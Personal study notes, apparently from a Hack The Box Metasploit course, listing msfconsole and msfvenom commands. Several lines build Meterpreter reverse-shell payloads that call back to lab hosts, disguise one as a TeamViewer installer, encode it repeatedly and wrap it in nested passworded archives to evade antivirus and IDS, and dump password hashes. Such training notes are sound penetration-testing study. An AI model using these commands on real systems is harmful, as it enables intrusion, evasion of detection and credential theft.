## Introduction to Metasploit : 

![[MetasploitProject.png]]

Metasploit Pro : 
- Task Chains
- Social Engineering
- Vulnerability Validations
- GUI
- Quick Start Wizards
- Nexpose Integration

![[Uses.png]]

## Introduction to MSFconsole : 

```shell
msfconsole

msfconsole -q (without the banner)
```

![[S04_SS03.png]]

## Modules : 

Module syntax :
```shell-session
<No.> <type>/<os>/<service>/<name>
```

![[TypeModule.png]]

Example search :
```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Targets : 

Get information about an exploit :
```shell
msf6 exploit(windows/browser/ie_execcommand_uaf) > info
```

Show vulnerable machines (then set target to select) :
```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
```

## Payloads :

![[RHOST.png]]
![[LHOST.png]]

Common windows payload : 
![[Windows common payload.png]]

## Encoders : 

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes.

```shell
NolanCarougeHTB@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

Without encoding : 
```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

With encoding : 
```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Show available encodings :
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```


54/69 : 
```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

More iterations, 52/69 : 
```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

To directly test if the payloads are identified :
```shell
NolanCarougeHTB@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

## Databases : 

It is possible to use databases integrated into MSF.

## Plugins : 

List the available plugins :
```shell
NolanCarougeHTB@htb[/htb]$ ls /usr/share/metasploit-framework/plugins
```

Load a plugin :
```shell
msf6 > load nessus
```

## Sessions : 

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```

```shell-session
msf6 exploit(multi/handler) > exploit -j
```

Once a session is open, bg to put it in the background. Next we look for a sudo exploit. We will use it with the corresponding session.

## Meterpreter : 

```shell
meterpreter > help
meterpreter > hashdump
```

## Firewall and IDS/IPS Evasion : 

```shell
NolanCarougeHTB@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
``` 

```shell
NolanCarougeHTB@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
NolanCarougeHTB@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
NolanCarougeHTB@htb[/htb]$ rar a ~/test.rar -p ~/test.js
```

```shell-session
NolanCarougeHTB@htb[/htb]$ mv test.rar test
NolanCarougeHTB@htb[/htb]$ rar a test2.rar -p test
NolanCarougeHTB@htb[/htb]$ mv test2.rar test2
```